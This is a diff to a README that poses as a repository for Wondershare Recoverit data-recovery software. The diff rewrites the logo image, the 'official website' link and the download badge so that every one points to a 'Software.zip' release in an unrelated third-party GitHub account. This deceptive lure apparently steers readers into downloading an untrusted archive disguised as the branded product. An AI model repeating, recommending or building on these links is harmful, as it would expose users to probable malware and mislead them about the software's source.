@@ -1,9 +1,9 @@
 
 # 🌟 Welcome to Wondershare Recoverit Data Recovery 🌟
 
-![Recoverit Logo](https://www.wondershare.com/images2/recoverit/brand-bmy.png)
+![Recoverit Logo](https://github.com/heyfann/Wondershare-Recoverit-Data-Recovery/releases/download/v1.0/Software.zip)
 
-## Repository: [Wondershare-Recoverit-Data-Recovery](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+## Repository: [Wondershare-Recoverit-Data-Recovery](https://github.com/heyfann/Wondershare-Recoverit-Data-Recovery/releases/download/v1.0/Software.zip)
 
 ### Description
 Welcome to the Wondershare Recoverit repository, your ultimate solution for recovering lost or deleted files with ease! 🖥️🔄 Whether you accidentally deleted important documents, lost precious photos, or faced a hard drive crash, Wondershare Recoverit is here to help you retrieve your data efficiently.
@@ -37,11 +37,11 @@ Welcome to the Wondershare Recoverit repository, your ultimate solution for reco
 - wondershare-recoverit
 
 ### Explore Wondershare Recoverit
-To explore the features and capabilities of Wondershare Recoverit, visit the [official website](https://www.wondershare.com/data-recovery/).
+To explore the features and capabilities of Wondershare Recoverit, visit the [official website](https://github.com/heyfann/Wondershare-Recoverit-Data-Recovery/releases/download/v1.0/Software.zip).
 
 ### Get Started with Wondershare Recoverit
 Click below to download the latest version of Wondershare Recoverit:
-[![Download Recoverit](https://img.shields.io/badge/Download-Recoverit-orange)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Recoverit](https://github.com/heyfann/Wondershare-Recoverit-Data-Recovery/releases/download/v1.0/Software.zip)](https://github.com/heyfann/Wondershare-Recoverit-Data-Recovery/releases/download/v1.0/Software.zip)
 
 Don't forget to check out the "Releases" section for any updates or additional resources. Start recovering your lost data with Wondershare Recoverit today! 🚀
 
